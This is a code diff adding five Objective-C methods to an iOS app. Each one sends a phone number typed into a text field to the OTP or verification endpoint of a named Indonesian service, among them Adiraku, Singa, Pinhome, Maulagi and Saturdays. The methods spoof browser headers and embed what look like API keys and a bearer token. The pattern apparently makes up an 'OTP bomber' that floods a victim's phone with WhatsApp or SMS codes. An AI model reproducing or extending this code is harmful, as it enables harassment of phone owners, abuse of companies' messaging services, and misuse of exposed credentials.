@@ -1294,3 +1294,154 @@
     }];
     [dataTask resume];
 }
+
+-(void)adiraku {
+    NSURL *url = [NSURL URLWithString:@"https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"];
+    NSDictionary *headers = @{
+        @"Content-Type": @"application/json; charset=utf-8"
+    };
+    NSString *phoneNumber = self.phoneTextField.text;
+    NSString *jsonString = [NSString stringWithFormat:@"{\"mobileNumber\":\"%@\",\"type\":\"prospect-create\",\"channel\":\"whatsapp\"}", phoneNumber];
+    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setAllHTTPHeaderFields:headers];
+    [request setHTTPBody:data];
+
+    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
+    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            [self logMessage:[NSString stringWithFormat:@"Adiraku Error: %@", error.localizedDescription]];
+        } else {
+            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
+            [self logMessage:[NSString stringWithFormat:@"Adiraku Response: %ld", (long)httpResponse.statusCode]];
+        }
+    }];
+    [dataTask resume];
+}
+
+-(void)singa {
+    NSURL *url = [NSURL URLWithString:@"https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.7&versionCode=153&platform=android"];
+    NSDictionary *headers = @{
+        @"Content-Type": @"application/json; charset=utf-8",
+        @"User-Agent": @"Mozilla/5.0 (Linux; Android 10)"
+    };
+    NSString *phoneNumber = self.phoneTextField.text;
+    NSString *jsonString = [NSString stringWithFormat:@"{\"mobile_phone\":\"+%@\",\"type\":\"mobile\",\"is_switchable\":1}", phoneNumber];
+    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setAllHTTPHeaderFields:headers];
+    [request setHTTPBody:data];
+
+    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
+    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            [self logMessage:[NSString stringWithFormat:@"Singa Error: %@", error.localizedDescription]];
+        } else {
+            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
+            [self logMessage:[NSString stringWithFormat:@"Singa Response: %ld", (long)httpResponse.statusCode]];
+        }
+    }];
+    [dataTask resume];
+}
+
+-(void)pinhome {
+    NSURL *url = [NSURL URLWithString:@"https://www.pinhome.id/api/pinaccount/request/otp"];
+    NSDictionary *headers = @{
+        @"Host": @"www.pinhome.id",
+        @"Accept": @"application/json",
+        @"Authorization": @"Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731",
+        @"Content-Type": @"application/json",
+        @"User-Agent": @"Mozilla/5.0 (Linux; Android 10)",
+        @"Origin": @"https://www.pinhome.id"
+    };
+    NSString *phoneNumber = self.phoneTextField.text;
+    NSString *jsonString = [NSString stringWithFormat:@"{\"accountType\":\"customers\",\"countryCode\":\"62\",\"medium\":\"whatsapp\",\"otpType\":\"register\",\"phoneNumber\":\"%@\"}", phoneNumber];
+    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setAllHTTPHeaderFields:headers];
+    [request setHTTPBody:data];
+
+    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
+    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            [self logMessage:[NSString stringWithFormat:@"Pinhome Error: %@", error.localizedDescription]];
+        } else {
+            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
+            [self logMessage:[NSString stringWithFormat:@"Pinhome Response: %ld", (long)httpResponse.statusCode]];
+        }
+    }];
+    [dataTask resume];
+}
+
+-(void)maulagi {
+    NSURL *url = [NSURL URLWithString:@"https://api.maulagi.id/api/v2/auth/check"];
+    NSDictionary *headers = @{
+        @"accept": @"application/json, text/plain, */*",
+        @"content-type": @"application/json",
+        @"origin": @"https://maulagi.id",
+        @"referer": @"https://maulagi.id/",
+        @"user-agent": @"Mozilla/5.0 (Linux; Android 14) Chrome/107.0.0.0 Mobile Safari/537.36",
+        @"x-ml-key": @"E32VCHXX32"
+    };
+    NSString *phoneNumber = self.phoneTextField.text;
+    NSString *jsonString = [NSString stringWithFormat:@"{\"credentials\":\"%@\"}", phoneNumber];
+    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setAllHTTPHeaderFields:headers];
+    [request setHTTPBody:data];
+
+    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
+    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            [self logMessage:[NSString stringWithFormat:@"Maulagi Error: %@", error.localizedDescription]];
+        } else {
+            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
+            [self logMessage:[NSString stringWithFormat:@"Maulagi Response: %ld", (long)httpResponse.statusCode]];
+        }
+    }];
+    [dataTask resume];
+}
+
+-(void)saturdays {
+    NSURL *url = [NSURL URLWithString:@"https://beta.api.saturdays.com/api/v1/user/otp/send"];
+    NSDictionary *headers = @{
+        @"accept": @"*/*",
+        @"accept-language": @"id-ID,id;q=0.9",
+        @"content-type": @"application/json",
+        @"country-code": @"ID",
+        @"currency-code": @"IDR",
+        @"device-type": @"mweb",
+        @"origin": @"https://saturdays.com",
+        @"referer": @"https://saturdays.com/",
+        @"user-agent": @"Mozilla/5.0 (Linux; Android 14) Chrome/107.0.0.0 Mobile Safari/537.36",
+        @"platform": @"mweb",
+        @"x-api-key": @"GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj"
+    };
+    NSString *phoneNumber = self.phoneTextField.text;
+    NSString *jsonString = [NSString stringWithFormat:@"{\"number\":\"%@\",\"country_code\":\"+62\",\"type\":\"\"}", phoneNumber];
+    NSMutableData *data = [[NSMutableData alloc] initWithData:[jsonString dataUsingEncoding:NSUTF8StringEncoding]];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setAllHTTPHeaderFields:headers];
+    [request setHTTPBody:data];
+
+    NSURLSessionConfiguration *defaultSessionConfiguration = [NSURLSessionConfiguration defaultSessionConfiguration];
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:defaultSessionConfiguration];
+    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            [self logMessage:[NSString stringWithFormat:@"Saturdays Error: %@", error.localizedDescription]];
+        } else {
+            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
+            [self logMessage:[NSString stringWithFormat:@"Saturdays Response: %ld", (long)httpResponse.statusCode]];
+        }
+    }];
+    [dataTask resume];
+}
